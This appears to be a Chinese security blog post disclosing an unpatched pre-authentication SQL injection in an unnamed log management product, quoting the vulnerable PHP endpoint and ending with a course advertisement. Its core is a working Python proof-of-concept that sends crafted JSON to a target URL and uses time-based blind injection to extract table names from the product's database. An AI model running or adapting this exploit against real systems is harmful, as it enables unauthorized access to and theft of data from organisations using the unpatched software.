#  某日志管理系统前台注入（0day）  
原创 知名小朋友  进击安全   2025-06-08 07:33  
  
**免责申明**  
  
本文章仅用于信息安全防御技术分享，因用于其他用途而产生不良后果,作者不承担任何法律责任，请严格遵循中华人民共和国相关法律法规，禁止做一切违法犯罪行为。  
  
  
一、前言  
  
学习一下这个审计流程，在审计过程当中遇到了重重防护最终找到注入点。  
### 二、审计流程  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y38JTWiaFzTmsbrct4E057icRjOibmicqqaOdJethByAJBQmgytBKljdUiaHDw/640?wx_fmt=png&from=appmsg "")  
  
查看文件目录结构可以看出来不是框架类型的，我们找到相关的鉴权方式。  
#### 鉴权  
  
这里其实直接可以看出来在chksession方法可以进行鉴权，避开他进行审计。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y38oUbqcwGxdx84q9lqNeK3jJ1B4sG2UpcGRpsuicTbp2CBRXbC9w5jQTg/640?wx_fmt=png&from=appmsg "")  
#### 三、前台注入  
  
在文件logd/www/singleuser_action.php当中存在一个相关的漏洞。  
  
代码如下：  
```
<?php
  include "common.php";

$userinfo = file_get_contents('php://input');
if (empty($userinfo)) {
  outputres("no", "NO_USERINFO");
  exit;
}

$json = json_decode($userinfo);
$operation_type = $json->syncInfo->operationType;

if (($conn = my_mysql_connect()) == false) {
  outputres("no", "MYSQL_CONNECT_ERROR");
  exit;
}

$sql = $sql2 = "";

/*
 * 创建singleuser表
 */
if ($operation_type == "ADD_USER" || $operation_type == "UPDATE_USER" || 
    $operation_type == "DELETE_USER") {
  $sql = "create table if not exists palog.singleuser(".
    "id int not null auto_increment primary key, ".
    "user_id VARCHAR(32) NOT NULL DEFAULT '',".
    "account_status varchar(8) not null default '',".
    "user_name VARCHAR(200) NOT NULL DEFAULT '',".
    "user_pwd varchar(64) NOT NULL DEFAULT '',".
    "user_sex varchar(2) NOT NULL DEFAULT '',".
    "user_birthday varchar(19) NOT NULL DEFAULT '',".
    "user_post varchar(50) NOT NULL DEFAULT '',".
    "user_rank varchar(50) NOT NULL DEFAULT '',".
    "user_phone varchar(50) NOT NULL DEFAULT '',".
    "user_mobilephone varchar(50) NOT NULL DEFAULT '',".
    "user_mailaddress varchar(50) NOT NULL DEFAULT '',".
    "user_ca varchar(4000) NOT NULL DEFAULT '',".
    "user_class varchar(32) NOT NULL DEFAULT '',".
    "parent_id varchar(30) NOT NULL DEFAULT '',".
    "employee_id varchar(30) NOT NULL DEFAULT '',".
    "department_id varchar(30) NOT NULL DEFAULT '',".
    "coporation_id varchar(30) NOT NULL DEFAULT '',".
    "user_duty varchar(200) NOT NULL DEFAULT '',".
    "user_postcode varchar(50) NOT NULL DEFAULT '',".
    "user_alias varchar(100) NOT NULL DEFAULT '',".
    "user_homeaddress varchar(200) NOT NULL DEFAULT '',".
    "user_msn varchar(50) NOT NULL DEFAULT '',".
    "user_nt varchar(256) NOT NULL DEFAULT '',".
    "bxlx varchar(10) NOT NULL DEFAULT ''".
    ")ENGINE=MyISAM default charset=utf8";
  if (mysql_query($sql) == false) {
    outputres("no", mysql_error());
    mysql_close();
    exit;
  }

  $user_id = $json->syncInfo->user->userId;
  $user_name = $json->syncInfo->user->userName;
  $employee_id= $json->syncInfo->user->employeeId;
  $department_id = $json->syncInfo->user->departmentId;
  $department_name = $json->syncInfo->user->departmentName;
  $coporation_id = $json->syncInfo->user->coporationId;
  $corporation_name = $json->syncInfo->user->corporationName;
  $user_sex = $json->syncInfo->user->userSex;
  $user_duty = $json->syncInfo->user->userDuty;
  $user_birthday = $json->syncInfo->user->userBirthday;
  $user_post = $json->syncInfo->user->userPost;
  $user_postCode = $json->syncInfo->user->userPostCode;
  $user_alias = $json->syncInfo->user->userAlias;
  $user_rank = $json->syncInfo->user->userRank;
  $user_phone = $json->syncInfo->user->userPhone;
  $user_homeaddress = $json->syncInfo->user->userHomeAddress;
  $user_mobilephone = $json->syncInfo->user->userMobilePhone;
  $user_mailaddress = $json->syncInfo->user->userMailAddress;
  $user_msn = $json->syncInfo->user->userMSN;
  $user_nt = $json->syncInfo->user->userNt;
  $user_ca = $json->syncInfo->user->userCA;
  $user_pwd = $json->syncInfo->user->userPwd;
	$user_class = $json->syncInfo->user->userClass;
	$parent_id = $json->syncInfo->user->parentId;
	$bxlx = $json->syncInfo->user->bxlx;

	switch($operation_type) {
	case "ADD_USER":
		$sql = "insert into palog.singleuser(user_id, user_name, user_pwd, account_status, user_sex, user_birthday, user_post, user_rank, user_phone, user_mobilephone, user_mailaddress, user_ca, user_class, parent_id, employee_id, department_id, coporation_id, user_duty, user_postcode, user_alias, user_homeaddress, user_msn, user_nt, bxlx) values('$user_id', '$user_name', '$user_pwd', '$account_status', '$user_sex', '$user_birthday', '$user_post', '$user_rank', '$user_phone', '$user_mobilephone', '$user_mailaddress', '$user_ca', '$user_class', '$parent_id', '$employee_id', '$department_id', '$coporation_id', '$user_duty', '$user_postcode', '$user_alias', '$user_homeaddress', '$user_msn', '$user_nt', '$bxlx')";
		$sql2 = "insert into palog.users(username, password, mod_1)values('$user_id', '$user_pwd', 'Y')";
		break;

	case "DELETE_USER":
		$sql = "delete from palog.singleuser where user_id='$user_id'";
		$sql2 = "delete from palog.users where username='$user_id'";
		break;

	case "UPDATE_USER":
		$sql = "update palog.singleuser set user_name='$user_name', user_pwd='$user_pwd', account_status='$account_status', user_sex='$user_sex', user_birthday='$user_birthday', user_post='$user_post', user_rank='$user_rank', user_phone='$user_phone', user_mobilephone='$user_mobilephone', user_mailaddress='$user_mailaddress', user_ca='$user_ca', user_class='$user_class', parent_id='$parent_id', employee_id='$employee_id', department_id='$department_id', coporation_id='$coporation_id', user_duty='$user_duty', user_postcode='$user_postcode', user_alias='$user_alias', user_homeaddress='$user_homeaddress', user_msn='$user_msn', user_nt='$user_nt', bxlx='$bxlx' where user_id='$user_id'";
		break;
	}
}
else
if ($operation_type == "ADD_ORGAN" || $operation_type == "DELETE_ORGAN" || 
	$operation_type == "UPDATE_ORGAN" || $operation_type == "MERGE_ORGAN") {
	/*
	 * 创建表
	 */
	$sql = "create table if not exists palog.single_organ(id int auto_increment primary key, organ_id varchar(30) not null default '', organ_name varchar(80) not null default '', organ_type varchar(32) not null default '', parent_id varchar(30) not null default '', stru_id varchar(50) not null default '', stru_type varchar(32) not null default '', stru_path varchar(64) not null default '', department_id varchar(30) not null default '', department_name varchar(80) not null default '', coporation_id varchar(30) not null default '', corporation_name varchar(80) not null default '', is_use char(1) not null default '1', is_leaf varchar(1) not null default '')ENGINE=MyISAM DEFAULT charset=utf8";
	if (mysql_query($sql) == false) {
		outputres("no", mysql_error());
		mysql_close();
		exit;
	}

	$stru_id = $json->syncInfo->stru->struId;
	$organ_id = $json->syncInfo->stru->organId;
	$stru_type = $json->syncInfo->stru->struType;
	$parent_id = $json->syncInfo->stru->parentId;
	$stru_path = $json->syncInfo->stru->struPath;
	$organ_code = $json->syncInfo->stru->organCode;
	$organ_name = $json->syncInfo->stru->organName;
	$organ_type = $json->syncInfo->stru->organType;
	$department_id = $json->syncInfo->stru->departmentId;
	$department_name = $json->syncInfo->stru->departmentName;
	$corporation_name = $json->syncInfo->stru->corporationName;
	$is_leaf = $json->syncInfo->stru->isLeaf;
	$is_use = $json->syncInfo->stru->isUse;

	switch($operation_type) {
		case "ADD_ORGAN":
			$sql = "insert into palog.single_organ(organ_id, organ_name, organ_type, parent_id, stru_id, stru_type, stru_path, department_id, department_name, coporation_id, corporation_name, is_use, is_leaf) values('$organ_id', '$organ_name', '$organ_type', '$parent_id', '$stru_id', '$stru_type', '$stru_path', '$department_id', '$department_name', '$coporation_id', '$corporation_name', '$is_use', '$is_leaf')";
			break;

		case "DELETE_ORGAN":
			$sql = "delete from palog.single_organ where organ_id='$organ_id'";
			break;

		case "UPDATE_ORGAN":
			$sql = "update palog.single_organ set organ_name='$organ_name', organ_type='$organ_type', stru_id='$stru_id', stru_type='$stru_type', stru_path='$stru_path', department_id='$department_id', department_name='$department_name', coporation_id='$coporation_id', corporation_name='$corporation_name' where organ_id='$organ_id'";
			break;

		case "MERGE_ORGAN":
			break;

		default:
			outputres("no", "NO_ACTION");
			mysql_close();
			exit;
	}
}
else {
	mysql_close();
	outputres("no", "NO_OPERATION_TYPE");
	exit;
}

if (mysql_query($sql) == false) {
	outputres("no", mysql_error());
	mysql_close();
	exit;
}

if ($sql2 != "")
	mysql_query($sql2);

mysql_close();

outputres("yes", "OK");
exit;

?>

```  
  
可以看到存在一个可控点：$userinfo = file_get_contents('php://input');  
  
这里给到参数userinfo  
```
$json = json_decode($userinfo);
$operation_type = $json->syncInfo->operationType;
```  
  
然后将传递当中的syncInfo当中的operationType传递给$operation_type  
  
其实这种方式传递参数就是如下方式：  
```
{
  "syncInfo":
  {
  "operationType":"value"
  }
}
```  
  
以这种方式进行传递参数，刚好在下面可以看到一个信息。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y38I7RGzZ6hXdjS9R0gUYbXlpkia1N26unU1icuKqtzdgAK7dNaQAyybvrQ/640?wx_fmt=png&from=appmsg "")  
  
可以看到user_id进行回溯。  
```
	$user_id = $json->syncInfo->user->userId;
```  
  
可以看到是通过$json过来的，看看$json  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y38q61ylEfBUibdXkOKRh6oRFtbibS8eWBkvfKFdrc0Wyjymz6icMTU6iaSicQ/640?wx_fmt=png&from=appmsg "")  
  
发现我们的参数可控，然后进行查看要求因为上面有case分支，查看这个分支。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y38nHl7pEMmSgZR5F7VJxIZ1GAf2S08CabuPvoF0QV7EMoEp6yEb0gneQ/640?wx_fmt=png&from=appmsg "")  
  
分支也是可控的，所以我们直接可以进行构造数据包进行测试。  
  
这里写好了相关POC  
#### 四、POC  
```
import time
import string
import requests
characters = string.ascii_letters + string.digits
import logging
logging.captureWarnings(True)

url = 'https://xxxx.php'
headers = {
    'Content-Type': 'application/json'
}
def data_post(payload):
    data = """{
        "syncInfo": {
            "operationType": "UPDATE_USER",
            "stru": {
                "struId": "1",
                "organId": "1",
                "struType": "1",
                "parentId": "1",
                "struPath": "1",
                "organCode": "1",
                "organName": "1",
                "organType": "1",
                "departmentId": "1",
                "departmentName": "1",
                "corporationName": "1",
                "isLeaf": "1",
                "isUse": "1"
            },
            "user": {
                "userId": "1",
                "userName": """+payload+""",
                "employeeId": "1",
                "departmentId": "1",
                "departmentName": "1",
                "coporationId": "1",
                "corporationName": "1",
                "userSex": "1",
                "userDuty": "1",
                "userBirthday": "1",
                "userPost": "1",
                "userPostCode": "1",
                "userAlias": "1",
                "userRank": "1",
                "userPhone": "1",
                "userHomeAddress": "1",
                "userMobilePhone": "1",
                "userMailAddress": "1",
                "userMSN": "1",
                "userNt": "1",
                "userCA": "1",
                "userPwd": "1",
                "userClass": "1",
                "parentId": "1",
                "bxlx": "1"
            }
        }
    }"""
    return data


def requ_biao():
    for i in range(0,30):
        for a in range(0,30):
            payload = """"1' and if(length((select table_name from information_schema.tables where table_schema='palog' limit 0,"""+str(i)+"""))="""+str(a)+""",sleep(1),1)#\""""
            data = data_post(str(payload))
            print(data)
            time_init = time.time()
            requests.post(url=url, data=data, headers=headers, proxies={'http': 'http://127.0.0.1:8080'},verify=False)
            time_desy = time.time()
            time_easy = time_desy-time_init
            if time_easy> float(8):
                print("第"+str(i)+"个表长度为"+str(a))
                break
            else:
                # print("正在验证第"+str(i)+"表长度"+str(a))
                print()
def requ_biao_dump():
    tables = ''
    for i in range(0,20):
        for a in characters:
            # ?id = 1 and if (substr((select table_name from information_schema.tables where table_schema=database() limit 0, 1), 1, 1)='n', sleep(3), 1)

            payload = f""""1' and if (substr((select table_name from information_schema.tables where table_schema='palog' limit 0, 1), {i}, 1)='{a}', sleep(1), 1)#\""""
            data = data_post(str(payload))
            # print(data)
            time_init = time.time()
            requests.post(url=url, data=data, headers=headers, proxies={'http': 'http://127.0.0.1:8080'},verify=False)
            time_desy = time.time()
            time_easy = time_desy-time_init
            if time_easy> float(8):
                print("第"+str(i)+"个表名为"+str(a))
                tables+=a
                print("[+] table: ",tables)
                break
            else:
                print("",end="")
if __name__ == '__main__':
    requ_biao_dump()
```  
  
这里有一个小的tips就是，正常我们执行语句为select * from user;这种，但是前提要求是指定数据库，然后这个源码当中并未指定相关数据库，所以要查询user需要如下语句：  
  
select * from 数据库.user;方式来进行查询。  
  
例如 select * from information_schema.tables.user;方式。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhWw1vjwEqBunJ6GvZsL3Y384ZqJze4ZMQ7h0xExBIK6icbueP2hsxc2SbMC5tuQwa6Fs8Fdrv3qxhw/640?wx_fmt=png&from=appmsg "")  
  
五、完结  
  
     代码审计第四期，富含PHP、JAVA、NET代码审计，顺带APP、小程序、WEB当中参数逆向以及JAVA工具二开与SRC案例讲解，其中多多0day讲解，实战案例分析，不拿着靶场去做，想学习速速报名了。  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/ZRKuxIKRyhUicibrBmrZ2iazoDJic2RyDklw4547e6aNia1OEMntI6wGqRdvr87XVgUdiaiczwW67bRO3iayvd7H7bZoeQ/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_jpg/ZRKuxIKRyhXhuxbCGecu4ibia3kSXD8ePQHrSvPSNtC7PmjzQwR88Hu0LpuXdQzamKBCPAXX82anLS8f0FF3LzzQ/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&tp=wxpic "")  
  
  
  
